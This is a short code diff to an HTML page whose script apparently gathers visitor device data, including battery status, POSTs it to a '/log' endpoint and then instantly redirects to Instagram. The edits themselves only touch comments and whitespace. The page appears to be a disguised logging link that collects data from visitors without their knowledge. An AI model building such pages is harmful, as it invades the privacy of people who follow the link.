@@ -19,7 +19,6 @@
                 charging = battery.charging ? "Yes" : "No";
             } catch (err) {}
 
-            // Send log to server
             await fetch('/log', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -35,11 +34,10 @@
                 })
             });
 
-            // Redirect instantly
+            // Instantly redirect
             window.location.href = "/go?url=https://www.instagram.com";
         })();
     </script>
 </head>
-<body>
-</body>
+<body></body>
 </html>
